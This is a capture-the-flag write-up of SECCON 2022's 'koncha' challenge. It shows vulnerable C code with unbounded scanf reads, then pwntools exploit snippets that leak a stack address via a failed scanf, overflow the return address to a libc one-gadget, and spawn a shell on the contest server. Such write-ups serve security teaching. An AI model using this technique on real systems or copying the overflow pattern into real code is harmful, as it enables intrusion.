# SECCON 2022

## koncha

koncha was a easy pwn challenge from SECCON 2022 quals

## Analysis

### checksec

```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

### file command output

```bash
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ld-2.31.so, BuildID[sha1]=444af262ad4af23ccec1cb9e3c7314c3b225a9ed, for GNU/Linux 3.2.0, not stripped
```

### Code

In this challenge the source code was provided, so reverse will be done quickly.

```c
#include <stdio.h>
#include <unistd.h>

int main() {
  char name[0x30], country[0x20];

  /* Ask name (accept whitespace) */
  puts("Hello! What is your name?");
  scanf("%[^\n]s", name);
  printf("Nice to meet you, %s!\n", name);

  /* Ask country */
  puts("Which country do you live in?");
  scanf("%s", country);
  printf("Wow, %s is such a nice country!\n", country);

  /* Painful goodbye */
  puts("It was nice meeting you. Goodbye!");
  return 0;
}

__attribute__((constructor))
void setup(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  alarm(180);
}
```

It is easy to see that this is a program that asks the user for its name and contry, prints some welcome and goodbye messages and returns. The vulnerability is also obvious. Both scanfs expose a buffer overflow vulnerability since:
  
- The first scanf will read until a new line ('\n') is found, without any caracter number limits
- The second scanf will read until a white caracter is found (space, new line or null byte), without any caracter limits.

This simply shows that this is a simple return to one gadget challenge.  
However, this binary has PIE turned on and we must assume ASLR is enabled on the host machine, thus we need leaks to bypass this mitigations in order to performed the usuall exploit.  

## Exploit

### PIE and ASLR leak

The only way to have a leak, would be to force the printfs to leak stack values. Since scanf always writes a null byte the end of a string, there won't be any non null terminated strings for printf to leak values. For this reason, one of the scanfs needs to fail, so that nothing is written on the buffers and printf prints the buffers as they were initialized. From scanf's man page:

```text
The set excludes those characters if the first character after the open bracket is a
circumflex ^
```

Therefore, passing a single '\n' will prevent scanf from writing on the buffer, and, consequently the printf will leak a stack value (note that the buffers were allocated in the stack, meaning that they will leak a stack value). This beats PIE and ASLR, as we can compute our targeted destinations as offsets of this leak. Bellow is the code for obtaining the leak and parsing it.

```python
io.sendline()
io.recvline()
line = io.recvline(keepends=True)[:-2].split(b' ')
leak = u64(line[-1].ljust(8,b'\x00'))
log.info(f"Leaked {hex(leak)}")
log.info(f"One gadget is at offset {hex(leak - OFFSET)}")
```

### Shell

Since PIE and ASLR was beaten, all that is left to do is overflow the country buffer (using the second scanf), overwrite main's return address and jump to one gadget. However, first we need to choose a one gadget to jump to

```text
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

I chose the second one gadget, because at the time main returns all its constrains were already met. I calculated that the one gadget is always at an offset of -0x10d7e7 from the leak that we obtained. Note that the other one gadgets might be possible to use, however they might require aditional gadgets to ensure the constrains are met.  
As you can see bellow I got a shell and the flag.

```python
def overflow():
        p = '1'*(0x60-8)
        return p.encode()
io.sendline(overflow() + p64(leak - OFFSET))
io.interactive()
```

This is just the overflow and RCE part of the exploit.

```bash
[+] Opening connection to koncha.seccon.games on port 9001: Done
[*] Leaked 0x7fc6acd3b2e8
[*] One gadget is at 0x7fc6acc2db01
[*] Switching to interactive mode
$ cat flag-50d05c4f3e767dfc58f5cde347c36370.txt
SECCON{I_should_have_checked_the_return_value_of_scanf}
```
